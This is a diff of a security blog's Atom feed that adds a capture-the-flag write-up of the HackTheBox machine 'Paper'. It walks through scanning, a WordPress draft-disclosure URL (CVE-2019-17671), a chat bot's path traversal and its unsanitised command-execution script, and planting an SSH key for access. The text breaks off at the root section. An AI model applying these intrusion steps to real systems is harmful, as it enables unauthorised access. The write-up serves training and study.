@@ -1,5 +1,283 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-06-12T13:50:00+02:00</updated><entry><title>HTB: Meta</title><link href="https://maggick.fr/2022/06/htb-meta.html" rel="alternate"></link><published>2022-06-12T13:50:00+02:00</published><updated>2022-06-12T13:50:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-12:/2022/06/htb-meta.html</id><summary type="html">&lt;p&gt;&lt;img alt="Meta card" class="align-left" src="/media/2022.06/meta_card.png" width="262"/&gt;&lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>maggick's logs - maggick</title><link href="https://maggick.fr/" rel="alternate"></link><link href="https://maggick.fr/feeds/maggick.atom.xml" rel="self"></link><id>https://maggick.fr/</id><updated>2022-06-19T14:55:00+02:00</updated><subtitle>Offensive security tales</subtitle><entry><title>HTB: Paper</title><link href="https://maggick.fr/2022/06/htb-paper.html" rel="alternate"></link><published>2022-06-19T14:55:00+02:00</published><updated>2022-06-19T14:55:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2022-06-19:/2022/06/htb-paper.html</id><summary type="html">&lt;p&gt;&lt;img alt="Paper Card" class="align-left" src="/media/2022.06/paper_card.png" width="262"/&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/432"&gt;Paper&lt;/a&gt; publish on
+February 05, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/92926"&gt;secnigma&lt;/a&gt;.
+This box is rated as an easy machine. It implies a verbose header, a vulnerable
+&lt;a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/"&gt;WordPress&lt;/a&gt;
+a rocket chat bot and the
+&lt;a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/"&gt;PolKit&lt;/a&gt; exploit.&lt;/p&gt;
+</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2022.06/paper_card.png" alt="Paper Card" width="262"&gt;&lt;/p&gt;
+&lt;p&gt;This article is a writeup about a retired HacktheBox machine:
+&lt;a href="https://www.hackthebox.com/home/machines/profile/432"&gt;Paper&lt;/a&gt; publish on
+February 05, 2022 by
+&lt;a href="https://www.hackthebox.com/home/users/profile/92926"&gt;secnigma&lt;/a&gt;.
+This box is rated as an easy machine. It implies a verbose header, a vulnerable
+&lt;a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/"&gt;WordPress&lt;/a&gt;
+a rocket chat bot and the
+&lt;a href="https://github.blog/2021-06-10-privilege-escalation-polkit-root-on-linux-with-bug/"&gt;PolKit&lt;/a&gt; exploit.&lt;/p&gt;
+
+
+&lt;h1&gt;Foothold and user&lt;/h1&gt;
+&lt;h2&gt;Recon&lt;/h2&gt;
+&lt;p&gt;Let us start as always by a &lt;code&gt;nmap&lt;/code&gt; scan. Only port 80 (HTTP), 443 (HTTPS) and 22 (SSH) are
+open.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.92 scan initiated Fri Feb 11 04:02:34 2022 as: nmap -p- -oN notes.md -sSV 10.129.138.109
+Nmap scan report for 10.129.138.109
+Host is up (0.014s latency).
+Not shown: 65532 closed tcp ports (reset)
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 8.0 (protocol 2.0)
+80/tcp  open  http     Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+443/tcp open  ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Feb 11 04:03:00 2022 -- 1 IP address (1 host up) scanned in 25.78 seconds
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The website is a default &lt;code&gt;nginx&lt;/code&gt; page.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="website" src="/media/2022.06/paper_01.png"&gt;&lt;/p&gt;
+&lt;p&gt;We run a &lt;code&gt;niko&lt;/code&gt; on the box and found the header disclosing the &lt;code&gt;office.paper&lt;/code&gt; subdomain.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ nikto -h http://10.129.138.109
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          10.129.138.109
++ Target Hostname:    10.129.138.109
++ Target Port:        80
++ Start Time:         2022-02-11 04:08:10 (GMT-5)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header &amp;#39;x-backend-server&amp;#39; found, with contents: office.paper
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The new website is a WordPress with a few articles and comments mentioning
+sensible data in the drats article.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Wordpress" src="/media/2022.06/paper_02.png"&gt;&lt;/p&gt;
+&lt;p&gt;The different articles and comments show that there might be juicy information
+in draft posts and that they are not as secure as &lt;code&gt;prisonmike&lt;/code&gt; think.
+We run a &lt;code&gt;wpscan&lt;/code&gt; on it.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ wpscan --url http://office.paper/  --api-token 7B19[REDACTED]
+_______________________________________________________________
+        __          _______   _____
+        \ \        / /  __ \ / ____|
+          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
+          \ \/  \/ / |  ___/ \___ \ / __|/ _` | &amp;#39;_ \
+            \  /\  /  | |     ____) | (__| (_| | | | |
+            \/  \/   |_|    |_____/ \___|\__,_|_| |_|
+
+        WordPress Security Scanner by the WPScan Team
+                        Version 3.8.20
+      Sponsored by Automattic - https://automattic.com/
+      @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
+_______________________________________________________________
+
+[+] URL: http://office.paper/ [10.129.138.109]
+[+] Started: Fri Feb 11 05:04:13 2022
+
+Interesting Finding(s):
+
+[+] Headers
+| Interesting Entries:
+|  - Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
+|  - X-Powered-By: PHP/7.2.24
+|  - X-Backend-Server: office.paper
+| Found By: Headers (Passive Detection)
+| Confidence: 100%
+
+[+] WordPress readme found: http://office.paper/readme.html
+| Found By: Direct Access (Aggressive Detection)
+| Confidence: 100%
+
+[+] WordPress version 5.2.3 identified (Insecure, released on 2019-09-05).
+| Found By: Rss Generator (Passive Detection)
+|  - http://office.paper/index.php/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.2.3&amp;lt;/generator&amp;gt;
+|  - http://office.paper/index.php/comments/feed/, &amp;lt;generator&amp;gt;https://wordpress.org/?v=5.2.3&amp;lt;/generator&amp;gt;
+|
+| [!] 31 vulnerabilities identified:
+|
+| [!] Title: WordPress &amp;lt;= 5.2.3 - Stored XSS in Customizer
+|     Fixed in: 5.2.4
+|     References:
+|      - https://wpscan.com/vulnerability/d39a7b84-28b9-4916-a2fc-6192ceb6fa56
+|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17674
+|      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+|      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+|
+| [!] Title: WordPress &amp;lt;= 5.2.3 - Unauthenticated View Private/Draft Posts
+|     Fixed in: 5.2.4
+|     References:
+|      - https://wpscan.com/vulnerability/3413b879-785f-4c9f-aa8a-5a4a1d5e0ba2
+|      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17671
+|      - https://wordpress.org/news/2019/10/wordpress-5-2-4-security-release/
+|      - https://blog.wpscan.com/wordpress/security/release/2019/10/15/wordpress-524-security-release-breakdown.html
+|      - https://github.com/WordPress/WordPress/commit/f82ed753cf00329a5e41f2cb6dc521085136f308
+|      - https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/
+&amp;lt;SNIP&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;The site is vulnerable to &lt;a href="https://0day.work/proof-of-concept-for-wordpress-5-2-3-viewing-unauthenticated-posts/"&gt;CVE-2019-17671&lt;/a&gt;
+allowing unauthenticated users to view
+the draft posts. We take a look at &lt;code&gt;prisonmike&lt;/code&gt;'s one using the
+URL &lt;code&gt;http://office.paper/index.php/author/prisonmike/?static=1&lt;/code&gt;. We got a
+"secret registration URL" for the rocket chat.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;test&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Threat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Level&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Midnight&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;A&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;MOTION&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;PICTURE&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SCREENPLAY&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;WRITTEN&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;AND&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;DIRECTED&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;BY&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;MICHAEL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;SCOTT&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nl"&gt;INT:&lt;/span&gt;&lt;span class="n"&gt;DAY&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="n"&gt;Inside&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;the&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;FBI&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Agent&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Michael&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Scarn&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;sits&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;with&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;his&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;feet&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;up&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;on&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;his&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;desk&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;His&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;robotic&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;butler&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Dwigt&lt;/span&gt;&lt;span class="err"&gt;…&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Secret&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Registration&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;URL&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;of&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;new&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Employee&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;chat&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;system&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="nl"&gt;http:&lt;/span&gt;&lt;span class="c1"&gt;//chat.office.paper/register/8qozr226AhkCHZdyY&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;am&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;keeping&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;this&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;draft&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;unpublished&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;as&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;unpublished&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;drafts&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;cannot&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;be&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;accessed&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;by&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;outsiders&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;I&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;am&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;not&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;that&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;ignorant&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Nick&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;#&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Also&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;stop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;looking&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;at&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;my&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;drafts&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="n"&gt;Jeez&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We register an account and see that there is bot &lt;code&gt;recyclops&lt;/code&gt; that allow to request and view
+files. We can start a private discussion with it and query its help menu.&lt;/p&gt;
+&lt;p&gt;We enumerate the working directory using the &lt;code&gt;file&lt;/code&gt; command and discover that
+&lt;code&gt;file ../&lt;/code&gt; is working.
+We enumerate the folder and found the bot home directory containing a scripts
+folder with a &lt;code&gt;run.js&lt;/code&gt; script inside.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;// Description:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c1"&gt;// Runs a command on hubot&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c1"&gt;// TOTAL VIOLATION of any and all security!&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c1"&gt;//&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c1"&gt;// Commands:&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="c1"&gt;// hubot run &amp;lt;command&amp;gt; - runs a command on hubot host&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+
+&lt;span class="nx"&gt;module&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;exports&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;robot&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;  &lt;/span&gt;&lt;span class="nx"&gt;robot&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;respond&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;/RUN (.*)$/i&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nx"&gt;console&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;log&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mf"&gt;1&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Running &amp;quot;&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="kd"&gt;var&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;require&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;child_process&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;).&lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="nx"&gt;exec&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;cmd&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kd"&gt;function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nx"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="k"&gt;if&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;error&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;stderr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="nx"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;stdout&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;          &lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="w"&gt;      &lt;/span&gt;&lt;span class="p"&gt;});&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;span class="p"&gt;};&lt;/span&gt;&lt;span class="w"&gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We use it and run &lt;code&gt;id&lt;/code&gt;. We discover that the bot is running as the &lt;code&gt;dwight&lt;/code&gt; user
+on the box. We can directly grab the user flag but we want a shell as user.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;run id
+uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We upload our SSH key on the box.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;run echo &amp;#39;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCzB[SNIP] kali@kali&amp;#39; &amp;gt;&amp;gt; ~/.ssh/authorized_keys
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;p&gt;We can then logging as &lt;code&gt;dwight&lt;/code&gt; using SSH and grab the user flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ ssh 10.129.138.109 -ldwight
+[dwight@paper ~]$ cat user.txt
+48cd829918540bb7a9bec8676f5b0024
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+&lt;h1&gt;Root&lt;/h1&gt;
+&lt;p&gt;The root part is a wild ride and I discussed it directly with the box author
+&lt;a href="https://www.hackthebox.com/home/users/profile/92926"&gt;secnigma&lt;/a&gt; over Discord.&lt;/p&gt;
+&lt;p&gt;When the box was released there was a bug in
+&lt;a href="https://github.com/carlospolop/PEASS-ng"&gt;linpeas&lt;/a&gt;
+&lt;a href="https://github.com/carlospolop/PEASS-ng/commit/48ff8b061b1724138313e362eac3cc84cc2dec73"&gt;fixed in the first days of the box&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;As you can see in the &lt;a href="https://github.com/carlospolop/PEASS-ng/commit/48ff8b061b1724138313e362eac3cc84cc2dec73"&gt;commit&lt;/a&gt;
+the script always flagged a box using &lt;code&gt;yum&lt;/code&gt; as "Vulnerable to CVE-2021-3560"
+(Polkit) if we run a
+&lt;a href="https://github.com/carlospolop/PEASS-ng"&gt;linpeas&lt;/a&gt; &lt;a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20220205"&gt;release prior to the patch
+date on the box&lt;/a&gt;
+we will see that the box is marked as vulnerable.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[dwight@paper ~]$ sh linpeas.sh
+
+
+╔══════════╣ Sudo version
